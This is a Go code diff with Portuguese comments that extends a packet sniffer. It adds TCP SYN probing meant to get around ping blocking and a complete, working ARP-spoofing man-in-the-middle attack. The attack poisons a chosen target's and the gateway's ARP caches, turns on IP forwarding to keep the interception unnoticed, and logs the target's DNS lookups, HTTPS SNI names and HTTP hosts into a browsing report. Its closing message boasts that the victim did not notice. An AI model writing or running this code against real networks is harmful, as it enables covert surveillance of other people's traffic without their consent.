@@ -6,8 +6,11 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
+	"runtime"
 	"sort"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/google/gopacket"
@@ -234,6 +237,8 @@ func (s *SnifferService) SniffNetwork(stopCh chan struct{}) {
 					if currentTTL, exists := logs.HostTTL[targetIP.String()]; !exists || currentTTL <= 4 {
 						targetMAC := net.HardwareAddr(arp.SourceHwAddress)
 						go s.sendICMPEchoRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP)
+						go s.sendTCPSynRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP, 135)
+						go s.sendTCPSynRequest(handle, myMAC, targetMAC, net.ParseIP(deviceIP), targetIP, 445)
 					}
 				}
 			}
@@ -254,8 +259,12 @@ func (s *SnifferService) SniffNetwork(stopCh chan struct{}) {
 					ipv4, _ := ipv4Layer.(*layers.IPv4)
 					ttl = ipv4.TTL
 					if srcIP != "" && ttl > 0 {
-						if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
-							logs.HostTTL[srcIP] = ttl
+						// Ignora TTL de pacotes multicast (SSDP, LLMNR, mDNS) que possuem TTL fixo em 1 ou 255, poluindo a base real
+						ipDestino := net.ParseIP(dstIP)
+						if ipDestino != nil && !ipDestino.IsMulticast() && ttl > 5 {
+							if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
+								logs.HostTTL[srcIP] = ttl
+							}
 						}
 					}
 				}
@@ -380,7 +389,7 @@ func (s *SnifferService) SniffNetwork(stopCh chan struct{}) {
 					if strings.Contains(payload, "iPad") {
 						logs.HostOSByDNS[srcIP] = "iOS (Apple)"
 					}
-					if strings.Contains(payload, "Android") || strings.Contains(payload, "_googlecast") {
+					if strings.Contains(payload, "Android") {
 						logs.HostOSByDNS[srcIP] = "Android"
 					}
 					if strings.Contains(payload, "DESKTOP-") || strings.Contains(payload, "LAPTOP-") || strings.Contains(payload, "WORKGROUP") {
@@ -909,6 +918,44 @@ func (s *SnifferService) sendICMPEchoRequest(handle *pcap.Handle, srcMAC net.Har
 	return handle.WritePacketData(buf.Bytes())
 }
 
+// sendTCPSynRequest constrói e injeta um pacote TCP SYN para testar portas e extrair o TTL de resposta (burlando o bloqueio de ping)
+func (s *SnifferService) sendTCPSynRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, dstMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP, dstPort uint16) error {
+	eth := layers.Ethernet{
+		SrcMAC:       srcMAC,
+		DstMAC:       dstMAC,
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+
+	ipv4 := layers.IPv4{
+		Version:  4,
+		TTL:      64,
+		SrcIP:    srcIP,
+		DstIP:    dstIP,
+		Protocol: layers.IPProtocolTCP,
+	}
+
+	tcp := layers.TCP{
+		SrcPort: layers.TCPPort(54321), // Porta de origem aleatória alta
+		DstPort: layers.TCPPort(dstPort),
+		SYN:     true,
+		Seq:     1105024978,
+		Window:  14600,
+	}
+	tcp.SetNetworkLayerForChecksum(&ipv4)
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp); err != nil {
+		return err
+	}
+
+	return handle.WritePacketData(buf.Bytes())
+}
+
 func (s *SnifferService) generateIPList(ipNet *net.IPNet) []net.IP {
 	var ips []net.IP
 	for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); s.incIP(ip) {
@@ -1052,4 +1099,435 @@ func parseHTTPHost(payload []byte) string {
 		}
 	}
 	return ""
+}
+
+// =====================================================================
+// ARP SPOOFING (Man-in-the-Middle) - Interceptação de Tráfego
+// =====================================================================
+
+// resolveGatewayMAC descobre o MAC do gateway enviando um ARP Request e esperando a resposta
+func (s *SnifferService) resolveGatewayMAC(deviceName string, srcMAC net.HardwareAddr, srcIP, gatewayIP net.IP) net.HardwareAddr {
+	handle, err := pcap.OpenLive(deviceName, 1600, true, 500*time.Millisecond)
+	if err != nil {
+		return nil
+	}
+	defer handle.Close()
+
+	// Envia ARP Request para o Gateway
+	_ = s.sendARPRequest(handle, srcMAC, srcIP, gatewayIP)
+
+	// Espera pela resposta ARP do Gateway (timeout de 3 segundos)
+	deadline := time.Now().Add(3 * time.Second)
+	for time.Now().Before(deadline) {
+		data, _, err := handle.ReadPacketData()
+		if err != nil {
+			continue
+		}
+		packet := gopacket.NewPacket(data, handle.LinkType(), gopacket.Default)
+		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
+			arp, _ := arpLayer.(*layers.ARP)
+			if arp.Operation == layers.ARPReply {
+				responderIP := net.IP(arp.SourceProtAddress)
+				if responderIP.Equal(gatewayIP) {
+					return net.HardwareAddr(arp.SourceHwAddress)
+				}
+			}
+		}
+	}
+	return nil
+}
+
+// sendARPReply envia um ARP Reply forjado (a base do ARP Spoofing)
+func (s *SnifferService) sendARPReply(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) error {
+	eth := layers.Ethernet{
+		SrcMAC:       srcMAC,
+		DstMAC:       dstMAC,
+		EthernetType: layers.EthernetTypeARP,
+	}
+
+	arp := layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPReply,
+		SourceHwAddress:   []byte(srcMAC),
+		SourceProtAddress: []byte(srcIP.To4()),
+		DstHwAddress:      []byte(dstMAC),
+		DstProtAddress:    []byte(dstIP.To4()),
+	}
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
+		return err
+	}
+
+	return handle.WritePacketData(buf.Bytes())
+}
+
+// enableIPForwarding ativa o encaminhamento de pacotes no SO para não derrubar a internet do alvo
+func enableIPForwarding() error {
+	if runtime.GOOS == "windows" {
+		// No Windows, ativamos o IP Routing via registro
+		cmd := exec.Command("powershell", "-Command",
+			"Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue")
+		return cmd.Run()
+	}
+	// Linux/macOS
+	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
+}
+
+// disableIPForwarding desativa o encaminhamento de pacotes (limpeza)
+func disableIPForwarding() {
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("powershell", "-Command",
+			"Set-NetIPInterface -Forwarding Disabled -ErrorAction SilentlyContinue")
+		_ = cmd.Run()
+	} else {
+		_ = os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
+	}
+}
+
+// ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo específico.
+// Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
+// a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
+func (s *SnifferService) ARPSpoofMitM(targetIP string, stopCh chan struct{}) {
+	devices, err := pcap.FindAllDevs()
+	if err != nil {
+		log.Println("  [-] Erro ao buscar interfaces:", err)
+		return
+	}
+
+	// Descobre a interface de rede ativa
+	var deviceName, deviceDesc, deviceIP string
+	for _, dev := range devices {
+		for _, addr := range dev.Addresses {
+			ip := addr.IP.String()
+			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
+				deviceName = dev.Name
+				deviceDesc = dev.Description
+				deviceIP = ip
+				break
+			}
+		}
+		if deviceName != "" {
+			break
+		}
+	}
+	if deviceName == "" {
+		log.Println("  [-] Nenhuma interface válida encontrada.")
+		return
+	}
+
+	fmt.Printf("\n  [*] ARP Spoof (Man-in-the-Middle)\n")
+	fmt.Printf("      Interface: %s\n", deviceDesc)
+	fmt.Printf("      IP Local:  %s\n", deviceIP)
+	fmt.Printf("      Alvo:      %s\n", targetIP)
+
+	// Recupera nosso MAC e CIDR
+	myMAC, cidr := s.getInterfaceDetails(deviceIP)
+	if myMAC == nil || cidr == "" {
+		log.Println("  [-] Erro ao recuperar detalhes da interface.")
+		return
+	}
+
+	// Descobre o Gateway (primeiro IP da sub-rede)
+	_, ipNet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		log.Println("  [-] Erro ao parsear CIDR:", err)
+		return
+	}
+	gatewayIP := make(net.IP, len(ipNet.IP))
+	copy(gatewayIP, ipNet.IP)
+	gatewayIP[len(gatewayIP)-1] = 1 // Ex: 10.67.80.1
+
+	fmt.Printf("      Gateway:   %s\n", gatewayIP.String())
+
+	// Resolve o MAC do Gateway
+	fmt.Printf("  [*] Resolvendo MAC do Gateway...\n")
+	gatewayMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), gatewayIP)
+	if gatewayMAC == nil {
+		log.Println("  [-] Não foi possível resolver o MAC do Gateway.")
+		return
+	}
+	fmt.Printf("      Gateway MAC: %s\n", gatewayMAC.String())
+
+	// Resolve o MAC do Alvo
+	fmt.Printf("  [*] Resolvendo MAC do Alvo (%s)...\n", targetIP)
+	targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(targetIP))
+	if targetMAC == nil {
+		fmt.Printf("  [-] ARP Request falhou. Tentando buscar em dispositivos conhecidos...\n")
+		known := loadKnownDevices()
+		for macStr, dev := range known {
+			if dev.LastIP == targetIP {
+				parsedMAC, err := net.ParseMAC(macStr)
+				if err == nil {
+					targetMAC = parsedMAC
+					fmt.Printf("  [+] MAC encontrado no cache local: %s\n", macStr)
+					break
+				}
+			}
+		}
+	}
+	
+	if targetMAC == nil {
+		log.Println("  [-] Não foi possível resolver o MAC do Alvo. A máquina está offline ou isolada (AP Isolation)?")
+		return
+	}
+	fmt.Printf("      Alvo MAC:    %s\n", targetMAC.String())
+
+	// Ativa IP Forwarding para não derrubar a internet do alvo
+	fmt.Printf("  [*] Ativando IP Forwarding...\n")
+	if err := enableIPForwarding(); err != nil {
+		fmt.Printf("  [!] Aviso: Não foi possível ativar IP Forwarding automaticamente: %v\n", err)
+		fmt.Printf("  [!] O tráfego do alvo pode ser interrompido. Considere ativar manualmente.\n")
+	}
+
+	// Abre o handle para injeção de pacotes ARP
+	poisonHandle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
+	if err != nil {
+		log.Println("  [-] Erro ao abrir handle para envenenamento:", err)
+		return
+	}
+	defer poisonHandle.Close()
+
+	// Abre um segundo handle para captura do tráfego interceptado
+	captureHandle, err := pcap.OpenLive(deviceName, 65535, true, 100*time.Millisecond)
+	if err != nil {
+		log.Println("  [-] Erro ao abrir handle de captura:", err)
+		return
+	}
+	defer captureHandle.Close()
+
+	fmt.Printf("\n  %s\n", strings.Repeat("=", 65))
+	fmt.Printf("  [✓] ENVENENAMENTO ARP ATIVO!\n")
+	fmt.Printf("  [✓] Todo tráfego de %s agora passa por nós.\n", targetIP)
+	fmt.Printf("  [!] Pressione ENTER para encerrar e restaurar a rede.\n")
+	fmt.Printf("  %s\n\n", strings.Repeat("=", 65))
+
+	// Inicializa os logs para captura
+	logs := NewSnifferLogs()
+
+	// Mutex para acesso thread-safe aos logs
+	var logsMu sync.Mutex
+
+	// Goroutine 1: Envia pacotes ARP forjados a cada 1.5 segundos
+	go func() {
+		for {
+			select {
+			case <-stopCh:
+				return
+			default:
+				// Diz ao ALVO: "O Gateway sou EU" (nosso MAC, IP do gateway)
+				_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
+				// Diz ao GATEWAY: "O Alvo sou EU" (nosso MAC, IP do alvo)
+				_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
+				time.Sleep(1500 * time.Millisecond)
+			}
+		}
+	}()
+
+	// Goroutine 2: Captura e analisa o tráfego interceptado
+	go func() {
+		for {
+			select {
+			case <-stopCh:
+				return
+			default:
+				data, _, err := captureHandle.ReadPacketData()
+				if err != nil {
+					continue
+				}
+
+				packet := gopacket.NewPacket(data, captureHandle.LinkType(), gopacket.Default)
+
+				// Filtra: só nos interessa tráfego DO ou PARA o alvo
+				netLayer := packet.NetworkLayer()
+				if netLayer == nil {
+					continue
+				}
+				srcIP := netLayer.NetworkFlow().Src().String()
+				dstIP := netLayer.NetworkFlow().Dst().String()
+
+				if srcIP != targetIP && dstIP != targetIP {
+					continue
+				}
+
+				logsMu.Lock()
+				logs.TotalPackets++
+				logs.TotalBytes += len(data)
+
+				// Captura MAC
+				var srcMAC string
+				if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
+					eth, _ := ethLayer.(*layers.Ethernet)
+					srcMAC = eth.SrcMAC.String()
+				}
+
+				// Captura TTL (o dado mais precioso do MitM!)
+				if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
+					ipv4, _ := ipv4Layer.(*layers.IPv4)
+					ttl := ipv4.TTL
+					if srcIP == targetIP && ttl > 5 {
+						ipDestino := net.ParseIP(dstIP)
+						if ipDestino != nil && !ipDestino.IsMulticast() {
+							if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
+								logs.HostTTL[srcIP] = ttl
+							}
+						}
+					}
+				}
+
+				// Associa MAC
+				if srcIP == targetIP && srcMAC != "" {
+					logs.DiscoveredHosts[srcIP] = srcMAC
+				}
+
+				// Captura SNI (HTTPS) e HTTP Host
+				if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
+					tcp, _ := tcpLayer.(*layers.TCP)
+					dstPort := tcp.DstPort.String()
+
+					if srcIP == targetIP {
+						// Captura SNI em HTTPS
+						if dstPort == "443" && len(tcp.Payload) > 0 {
+							sni := parseTLSSNI(tcp.Payload)
+							if sni != "" {
+								if logs.HostAccesses[srcIP] == nil {
+									logs.HostAccesses[srcIP] = make(map[string]int)
+								}
+								logs.HostAccesses[srcIP][sni]++
+								fmt.Printf("  [MitM] %s → HTTPS: %s\n", srcIP, sni)
+							}
+						}
+
+						// Captura Host em HTTP
+						if dstPort == "80" && len(tcp.Payload) > 0 {
+							host := parseHTTPHost(tcp.Payload)
+							if host != "" {
+								if logs.HostAccesses[srcIP] == nil {
+									logs.HostAccesses[srcIP] = make(map[string]int)
+								}
+								logs.HostAccesses[srcIP][host]++
+								fmt.Printf("  [MitM] %s → HTTP: %s\n", srcIP, host)
+							}
+						}
+					}
+				}
+
+				// Captura DNS
+				if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
+					dns, _ := dnsLayer.(*layers.DNS)
+					if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && srcIP == targetIP {
+						dnsQuery := string(dns.Questions[0].Name)
+						if logs.HostAccesses[srcIP] == nil {
+							logs.HostAccesses[srcIP] = make(map[string]int)
+						}
+						logs.HostAccesses[srcIP][dnsQuery]++
+
+						// Detecção de OS via Captive Portal
+						dnsLower := strings.ToLower(dnsQuery)
+						if detectedOS, match := captivePortalDomains[dnsLower]; match {
+							logs.HostOSByDNS[srcIP] = detectedOS
+						}
+
+						fmt.Printf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery)
+					}
+				}
+
+				logsMu.Unlock()
+			}
+		}
+	}()
+
+	// Bloqueia até o canal de parada ser fechado
+	<-stopCh
+
+	fmt.Printf("\n  [*] Encerrando ARP Spoof...\n")
+
+	// RESTAURAÇÃO: Envia os ARPs legítimos de volta para curar a tabela ARP
+	fmt.Printf("  [*] Restaurando tabelas ARP originais (enviando 5 pacotes de cura)...\n")
+	for i := 0; i < 5; i++ {
+		// Restaura o alvo: diz que o Gateway real tem o MAC real do gateway
+		_ = s.sendARPReply(poisonHandle, gatewayMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
+		// Restaura o gateway: diz que o alvo real tem o MAC real do alvo
+		_ = s.sendARPReply(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
+		time.Sleep(200 * time.Millisecond)
+	}
+
+	// Desativa IP Forwarding
+	disableIPForwarding()
+	fmt.Printf("  [✓] IP Forwarding desativado.\n")
+
+	// Gera relatório
+	logsMu.Lock()
+	defer logsMu.Unlock()
+
+	fmt.Printf("\n  =========================================================================\n")
+	fmt.Printf("             RELATÓRIO MitM - INTERCEPTAÇÃO DO ALVO %s\n", targetIP)
+	fmt.Printf("  =========================================================================\n")
+	fmt.Printf("  Volume Interceptado: %d Pacotes | %.2f KB\n", logs.TotalPackets, float64(logs.TotalBytes)/1024.0)
+
+	// Identificação de SO
+	if ttlVal, exists := logs.HostTTL[targetIP]; exists {
+		var detectedOS string
+		switch {
+		case ttlVal >= 1 && ttlVal <= 64:
+			detectedOS = "Linux/Android/iOS/macOS (TTL base 64)"
+		case ttlVal >= 65 && ttlVal <= 128:
+			detectedOS = "Windows (TTL base 128)"
+		case ttlVal >= 129 && ttlVal <= 255:
+			detectedOS = "Roteador/Equipamento de Rede (TTL base 255)"
+		}
+
+		// DNS tem prioridade
+		if osDNS, ok := logs.HostOSByDNS[targetIP]; ok {
+			detectedOS = osDNS
+		}
+
+		fmt.Printf("  TTL Capturado: %d → SO Detectado: %s\n", ttlVal, detectedOS)
+
+		// Salva no banco de dados de dispositivos conhecidos
+		if mac, ok := logs.DiscoveredHosts[targetIP]; ok && mac != "" {
+			fmt.Printf("  MAC Alvo: %s\n", mac)
+			knownDevices := loadKnownDevices()
+			knownDev := knownDevices[mac]
+			knownDev.OS = detectedOS
+			knownDev.LastIP = targetIP
+			knownDevices[mac] = knownDev
+			saveKnownDevices(knownDevices)
+			fmt.Printf("  [✓] Dispositivo salvo no banco de dados local.\n")
+		}
+	} else {
+		fmt.Printf("  [!] Nenhum TTL Unicast capturado do alvo. Ele pode não ter gerado tráfego.\n")
+	}
+
+	// Lista de acessos capturados
+	if accesses, ok := logs.HostAccesses[targetIP]; ok && len(accesses) > 0 {
+		fmt.Printf("\n  Destinos Acessados pelo Alvo:\n")
+		type domainCount struct {
+			domain string
+			count  int
+		}
+		var sortedAccesses []domainCount
+		for dom, count := range accesses {
+			sortedAccesses = append(sortedAccesses, domainCount{dom, count})
+		}
+		sort.Slice(sortedAccesses, func(i, j int) bool {
+			return sortedAccesses[i].count > sortedAccesses[j].count
+		})
+		for _, entry := range sortedAccesses {
+			fmt.Printf("      * %-50s (%d acessos)\n", entry.domain, entry.count)
+		}
+	} else {
+		fmt.Printf("\n  Nenhum destino capturado durante a interceptação.\n")
+	}
+
+	fmt.Printf("  =========================================================================\n")
+	fmt.Printf("  [✓] Rede restaurada com sucesso. O alvo não percebeu a interceptação.\n\n")
 }
